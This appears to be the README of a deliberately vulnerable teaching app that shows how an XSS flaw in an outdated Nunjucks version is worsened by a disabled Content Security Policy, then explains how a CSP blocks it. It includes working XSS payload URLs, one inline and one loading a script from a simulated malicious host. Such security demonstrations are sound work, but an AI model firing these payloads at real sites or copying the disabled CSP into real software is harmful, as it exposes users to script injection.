# XSS / CSP Exploit Example 

The purpose of this application is to demonstrate how a XSS exploit can be exacerbated
by a poor Content Security Policy (CSP).

The application purposefully uses an outdated version of the Nunjucks templating language
to exploit an issue with autoescaping user supplied content when supplied as an array
(https://github.com/mozilla/nunjucks/issues/835).

On top of this, the Content Security Policy is disabled for the page enabling external
scripts to be loaded. The purpose of this example is to illustrate how a CSP could help 
to reduce the impact of a XSS exploit. See `server/app.ts` line 47.

## To run the application

```
npm install
npm run start:dev 
```

Navigate to `http://localhost:3000?name=Jon`

## To exploit the application using an inline script:

Navigate to `http://localhost:3000?name[]=<script>alert('Exploited!')</script>exploiter`

## To demonstrate loading an external script

Serve the script on a different port to simulate serving it from a different, malicious site:
```
python -m SimpleHTTPServer 1234
```

Navigate to `http://localhost:3000?name[]=<script src="http://localhost:1234/innocuous-sounding-script.js"></script>exploiter`

## The Content Security Policy (CSP)

The CSP instructs the browser to block javascript (amongst other things such as CSS) from running unless it adhears
to the web page's policy.

A typical CSP might look something like this:
```
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", 'code.jquery.com'],
    styleSrc: ["'self'", 'code.jquery.com'],
    fontSrc: ["'self'"],
  },
},
```

The `scriptSrc` instructs the browser that only javascript that is loaded from 'self' (i.e. the same host as the web page
is hosted on) or a trusted third party such as jquery can be run. This also implicitly blocks any inline scripts from being
run (such as `<script>alert('Exploited!')</script>` where the javascript is not in a separate file served by the host and 
referenced with `<script src="..."></script>`)
